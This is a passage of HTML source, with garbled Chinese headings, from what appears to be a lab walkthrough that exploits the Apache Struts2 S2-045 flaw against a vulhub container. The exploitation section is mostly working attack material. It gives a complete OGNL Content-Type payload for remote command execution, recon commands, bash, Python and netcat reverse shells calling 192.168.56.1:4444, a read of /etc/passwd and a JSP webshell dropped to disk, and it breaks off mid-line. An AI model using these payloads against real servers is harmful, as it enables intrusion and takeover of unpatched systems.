class=&#34;hljs-attribute&#34;&gt;2363a15cda30&lt;/span&gt;   vulhub/struts2:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mvn-server&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min ago   Up &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min     &lt;span class=&#34;hljs-number&#34;&gt;0.0.0.0:8080&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;/tcp  s2-&lt;span class=&#34;hljs-number&#34;&gt;045&lt;/span&gt;-struts2-&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;ç¯å¢ƒéªŒè¯&#34;&gt;&lt;a href=&#34;#ç¯å¢ƒéªŒè¯&#34; class=&#34;headerlink&#34; title=&#34;ç¯å¢ƒéªŒè¯&#34;&gt;&lt;/a&gt;ç¯å¢ƒéªŒè¯&lt;/h3&gt;&lt;p&gt;è®¿é—® &lt;code&gt;http://192.168.56.102:8080/&lt;/code&gt; åº”è¯¥èƒ½çœ‹åˆ°Struts2é»˜è®¤é¡µé¢ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ¼æ´åˆ©ç”¨å®æˆ˜&#34;&gt;&lt;a href=&#34;#æ¼æ´åˆ©ç”¨å®æˆ˜&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´åˆ©ç”¨å®æˆ˜&#34;&gt;&lt;/a&gt;æ¼æ´åˆ©ç”¨å®æˆ˜&lt;/h2&gt;&lt;h3 id=&#34;Payloadæ„é€ åŸç†&#34;&gt;&lt;a href=&#34;#Payloadæ„é€ åŸç†&#34; class=&#34;headerlink&#34; title=&#34;Payloadæ„é€ åŸç†&#34;&gt;&lt;/a&gt;Payloadæ„é€ åŸç†&lt;/h3&gt;&lt;p&gt;æ¶æ„Content-Typeçš„æ ¸å¿ƒç»“æ„ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content&lt;/span&gt;-Type: %&amp;#123;OGNL_EXPRESSION&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;å®Œæ•´æ”»å‡»è½½è·&#34;&gt;&lt;a href=&#34;#å®Œæ•´æ”»å‡»è½½è·&#34; class=&#34;headerlink&#34; title=&#34;å®Œæ•´æ”»å‡»è½½è·&#34;&gt;&lt;/a&gt;å®Œæ•´æ”»å‡»è½½è·&lt;/h3&gt;&lt;figure class=&#34;highlight smalltalk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs smalltalk&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;GET&lt;/span&gt; / &lt;span class=&#34;hljs-type&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Host&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.102&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;User&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Agent&lt;/span&gt;: &lt;span class=&#34;hljs-type&#34;&gt;Mozilla&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;5.0&lt;/span&gt; (compatible; &lt;span class=&#34;hljs-type&#34;&gt;MSIE&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;9.0&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;NT&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6.1&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Win64&lt;/span&gt;; x64)&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Accept&lt;/span&gt;: text/html,application/xhtml+xml,application/xml;q=&lt;span class=&#34;hljs-number&#34;&gt;0.9&lt;/span&gt;,*/*;q=&lt;span class=&#34;hljs-number&#34;&gt;0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Connection&lt;/span&gt;: close&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Type&lt;/span&gt;: %&amp;#123;&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#nike&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;multipart/form-data&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;=@ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlContext&lt;/span&gt;@&lt;span class=&#34;hljs-type&#34;&gt;DEFAULT_MEMBER_ACCESS&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;):(&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;&lt;/span&gt;]).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlUtil&lt;/span&gt;@class)).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;))&lt;br&gt;    )).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.&lt;span class=&#34;hljs-type&#34;&gt;System&lt;/span&gt;@getProperty(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;os.name&amp;#x27;&lt;/span&gt;).toLowerCase().contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;win&amp;#x27;&lt;/span&gt;))).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd.exe&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/bin/bash&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;-c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;=new java.lang.&lt;span class=&#34;hljs-type&#34;&gt;ProcessBuilder&lt;/span&gt;(&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.start()).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.&lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;@getResponse().getOutputStream())).&lt;br&gt;    (@org.apache.commons.io.&lt;span class=&#34;hljs-type&#34;&gt;IOUtils&lt;/span&gt;@copy(&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;.flush())&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Length&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Payloadé€è¡Œè§£æ&#34;&gt;&lt;a href=&#34;#Payloadé€è¡Œè§£æ&#34; class=&#34;headerlink&#34; title=&#34;Payloadé€è¡Œè§£æ&#34;&gt;&lt;/a&gt;Payloadé€è¡Œè§£æ&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è¡¨è¾¾å¼ç‰‡æ®µ&lt;/th&gt;
&lt;th&gt;åŠŸèƒ½è¯´æ˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#nike=&amp;#39;multipart/form-data&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è®¾ç½®ä¼ªè£…çš„Content-Type&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è·å–é»˜è®¤æˆå‘˜è®¿é—®æƒé™&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#_memberAccess=#dm&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;ç»•è¿‡Struts2çš„å®‰å…¨é™åˆ¶&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#container=#context[...]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è·å–ActionContextå®¹å™¨&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedPackageNames().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;æ¸…é™¤åŒ…åé»‘åå•&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedClasses().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;æ¸…é™¤ç±»åé»‘åå•&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmd=&amp;#39;whoami&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#iswin=...contains(&amp;#39;win&amp;#39;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmds=(#iswin?&amp;#123;...&amp;#125;:&amp;#123;...&amp;#125;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;æ ¹æ®ç³»ç»Ÿç±»å‹æ„é€ å‘½ä»¤å‚æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#p=new ProcessBuilder(#cmds)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;åˆ›å»ºè¿›ç¨‹æ„å»ºå™¨&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#process=#p.start()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å¯åŠ¨è¿›ç¨‹æ‰§è¡Œå‘½ä»¤&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;IOUtils@copy(...)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å°†å‘½ä»¤è¾“å‡ºå†™å…¥HTTPå“åº”&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;æ”»å‡»æ•ˆæœæ¼”ç¤º&#34;&gt;&lt;a href=&#34;#æ”»å‡»æ•ˆæœæ¼”ç¤º&#34; class=&#34;headerlink&#34; title=&#34;æ”»å‡»æ•ˆæœæ¼”ç¤º&#34;&gt;&lt;/a&gt;æ”»å‡»æ•ˆæœæ¼”ç¤º&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;è¯·æ±‚å‘é€åçš„å“åº”&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt; OK&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Apache-Coyote/1.1&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html;charset=UTF-8&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;9&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Wed, 24 Jul 2025 08:30:45 GMT&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;br&gt;&lt;span class=&#34;language-haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;é«˜çº§åˆ©ç”¨æŠ€å·§&#34;&gt;&lt;a href=&#34;#é«˜çº§åˆ©ç”¨æŠ€å·§&#34; class=&#34;headerlink&#34; title=&#34;é«˜çº§åˆ©ç”¨æŠ€å·§&#34;&gt;&lt;/a&gt;é«˜çº§åˆ©ç”¨æŠ€å·§&lt;/h2&gt;&lt;h3 id=&#34;1-ä¿¡æ¯æ”¶é›†å‘½ä»¤&#34;&gt;&lt;a href=&#34;#1-ä¿¡æ¯æ”¶é›†å‘½ä»¤&#34; class=&#34;headerlink&#34; title=&#34;1. ä¿¡æ¯æ”¶é›†å‘½ä»¤&#34;&gt;&lt;/a&gt;1. ä¿¡æ¯æ”¶é›†å‘½ä»¤&lt;/h3&gt;&lt;figure class=&#34;highlight autoit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autoit&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# ç³»ç»Ÿä¿¡æ¯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;uname -a&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# å½“å‰ç”¨æˆ·&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# ç½‘ç»œé…ç½®&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ifconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# è¿›ç¨‹åˆ—è¡¨&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ps aux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# æ–‡ä»¶ç³»ç»Ÿ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ls -la /&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-åå¼¹Shell&#34;&gt;&lt;a href=&#34;#2-åå¼¹Shell&#34; class=&#34;headerlink&#34; title=&#34;2. åå¼¹Shell&#34;&gt;&lt;/a&gt;2. åå¼¹Shell&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Bashåå¼¹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&amp;gt;&amp;amp;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Pythonåå¼¹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;python -c &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;192.168.56.1\&amp;quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&amp;quot;&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# NCåå¼¹Shell  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;nc -e /bin/sh &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-æ–‡ä»¶æ“ä½œ&#34;&gt;&lt;a href=&#34;#3-æ–‡ä»¶æ“ä½œ&#34; class=&#34;headerlink&#34; title=&#34;3. æ–‡ä»¶æ“ä½œ&#34;&gt;&lt;/a&gt;3. æ–‡ä»¶æ“ä½œ&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# è¯»å–æ•æ„Ÿæ–‡ä»¶&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;cat /etc/passwd&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# å†™å…¥WebShell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;echo &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%@ page import=\&amp;quot;java.io.*\&amp;quot; %&amp;gt;&amp;lt;% String cmd = request.getParameter(\&amp;quot;cmd\&amp;quot;); Process p = Runtime.getRuntime().exec(cmd); %&amp;gt;&amp;quot;&lt;/span&gt; &amp;gt; /tmp/shell.jsp&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# ä¸‹è½½æ–‡ä»¶&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span 